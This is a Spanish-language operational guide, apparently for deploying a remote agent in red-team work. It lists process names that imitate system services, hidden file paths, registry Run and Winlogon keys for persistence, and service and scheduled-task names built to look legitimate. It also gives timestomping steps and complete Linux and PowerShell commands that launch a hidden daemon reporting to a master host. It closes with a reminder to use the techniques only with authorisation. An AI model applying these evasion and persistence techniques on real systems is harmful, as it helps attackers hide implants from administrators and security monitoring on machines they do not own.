# Nombres y Ubicaciones Recomendadas para Reducir Visibilidad

## Nombres de Proceso Legítimos (Camuflaje)

### Linux
Procesos comunes del sistema que son normales ver ejecutándose:
- `systemd-resolved` (default) - Servicio DNS de systemd
- `networkd-dispatcher` - Gestor de eventos de red
- `update-notifier` - Notificador de actualizaciones
- `dbus-daemon` - Bus de mensajes del sistema
- `accounts-daemon` - Gestor de cuentas
- `polkitd` - Framework de autorización
- `rsyslogd` - Demonio de logs
- `cron` - Planificador de tareas
- `snapd` - Gestor de paquetes snap

### Windows
Procesos comunes del sistema Windows:
- `RuntimeBroker` (default) - Gestor de permisos de apps UWP
- `svchost` - Host de servicios Windows (muy común)
- `conhost` - Host de consola
- `dwm` - Desktop Window Manager
- `taskhostw` - Host de tareas
- `csrss` - Client/Server Runtime
- `audiodg` - Audio Device Graph Isolation
- `SearchIndexer` - Indexador de búsqueda
- `WmiPrvSE` - WMI Provider Host

**Nota:** No uses nombres demasiado obvios como `System` o `services.exe` que son únicos.

## Ubicaciones de Archivos

### Linux - Ubicaciones menos obvias

**Binarios:**
```
/usr/local/bin/systemd-resolved
/opt/.hidden/srv
~/.local/bin/update-checker
~/.cache/systemd-resolved
/var/cache/.srv
/tmp/.systemd/resolved
```

**Logs:**
```
/var/tmp/.srv.log
~/.cache/.syslog
/tmp/.proc.log
/dev/shm/.srv.log  # RAM disk, no persiste al reiniciar
~/.local/share/.logs/system.log
```

**PID files:**
```
/var/tmp/.srv.pid
~/.cache/.pid
/tmp/.lock/srv.pid
/run/user/$(id -u)/.srv.pid
```

### Windows - Ubicaciones menos obvias

**Binarios:**
```
C:\Windows\Temp\RuntimeBroker.exe
C:\Windows\System32\spool\RuntimeBroker.exe
C:\ProgramData\Microsoft\Windows\RuntimeBroker.exe
C:\Users\Public\Libraries\RuntimeBroker.exe
%APPDATA%\Microsoft\Windows\Start Menu\RuntimeBroker.exe
%LOCALAPPDATA%\Temp\RuntimeBroker.exe
```

**Logs:**
```
C:\Windows\Temp\.srv.log
C:\ProgramData\.system.log
%APPDATA%\.logs\system.log
%LOCALAPPDATA%\Temp\.srv.log
```

**PID files:**
```
C:\Windows\Temp\.srv.pid
C:\ProgramData\.pid
%LOCALAPPDATA%\Temp\.lock
```

## Puertos Comunes (menos sospechosos)

### Puertos de servicios legítimos:
```
53    - DNS (requiere admin/root)
80    - HTTP (requiere admin/root)
443   - HTTPS (requiere admin/root)
3306  - MySQL
5432  - PostgreSQL
6379  - Redis
8080  - HTTP alternativo
8443  - HTTPS alternativo
27017 - MongoDB
```

### Puertos altos (no requieren privilegios):
```
49152-65535 - Rango dinámico/privado
```

**Recomendación:** Usa puertos en el rango 49152-65535 para no requerir privilegios especiales.

## Claves de Registro para Persistencia (Windows)

### Run keys (ejecuta al login del usuario):
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

### Run keys del sistema (ejecuta para todos los usuarios):
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
```

### Ubicaciones menos obvias:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
```

## Nombres de Servicio (Windows)

Nombres de servicios que suenan legítimos:
```
WindowsUpdateService
NetworkTimeService
SecurityHealthService
DiagnosticService
RemoteManagementService
SystemMonitorService
```

## Tareas Programadas (Windows)

Nombres de tareas que suenan legítimos:
```
\Microsoft\Windows\UpdateOrchestrator\UpdateCheck
\Microsoft\Windows\Maintenance\SystemCheck
\Microsoft\Windows\NetworkProfile\NetworkCheck
\Microsoft\Windows\Time Synchronization\SynchronizeTime
```

## Cron Jobs (Linux)

Comentarios que parecen legítimos en crontab:
```
# System health check
# Network connectivity monitor
# Log rotation cleanup
# Cache maintenance
```

## Consejos Generales

1. **Consistencia:** Si usas `RuntimeBroker.exe`, el servicio también debería llamarse algo relacionado con Runtime
2. **Capitalización:** Windows usa PascalCase (`RuntimeBroker`), Linux usa kebab-case (`systemd-resolved`)
3. **Ubicación:** Coloca archivos donde se espera encontrar archivos temporales o de sistema
4. **Permisos:** Usa permisos que coincidan con el propósito aparente del archivo
5. **Timestamps:** Considera usar `touch` para ajustar timestamps de archivos a fechas pasadas
6. **Mezclarse:** Elige nombres y ubicaciones que se mezclen con el entorno existente

## Ejemplos de Comandos con Camuflaje Completo

### Linux (máximo camuflaje):
```bash
sudo cp dist/systemd-resolved /usr/local/bin/systemd-resolved
sudo chmod 755 /usr/local/bin/systemd-resolved
sudo touch -t 202301010000 /usr/local/bin/systemd-resolved  # Timestamp antiguo

/usr/local/bin/systemd-resolved \
    --daemon \
    --silent \
    --token "$(openssl rand -hex 32)" \
    --pidfile /var/tmp/.systemd-resolved.pid \
    --logfile /var/tmp/.systemd.log \
    --process-name systemd-resolved \
    --port 53128 \
    --master-host 192.168.1.100 \
    --master-port 65433
```

### Windows (máximo camuflaje):
```powershell
Copy-Item dist\RuntimeBroker.exe C:\Windows\System32\spool\RuntimeBroker.exe
$file = Get-Item C:\Windows\System32\spool\RuntimeBroker.exe
$file.CreationTime = '01/01/2023 00:00:00'
$file.LastWriteTime = '01/01/2023 00:00:00'

$startInfo = New-Object System.Diagnostics.ProcessStartInfo
$startInfo.FileName = "C:\Windows\System32\spool\RuntimeBroker.exe"
$token = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 32 | ForEach-Object {[char]$_})
$startInfo.Arguments = "--hide-window --silent --token $token --pidfile C:\ProgramData\.pid --logfile C:\ProgramData\.log --process-name RuntimeBroker --port 53128 --master-host 192.168.1.100 --master-port 65433"
$startInfo.WindowStyle = 'Hidden'
$startInfo.CreateNoWindow = $true
[System.Diagnostics.Process]::Start($startInfo)
```

## RECORDATORIO LEGAL

Todas estas técnicas deben usarse ÚNICAMENTE en:
- Entornos donde tengas autorización EXPLÍCITA por escrito
- Simulaciones de seguridad autorizadas
- Administración remota legítima de sistemas institucionales
- Red-teaming autorizado

Documentar siempre:
- ✅ Qué hosts fueron afectados
- ✅ Cuándo se desplegó
- ✅ Quién autorizó
- ✅ Propósito de la operación
- ✅ Fecha de limpieza programada
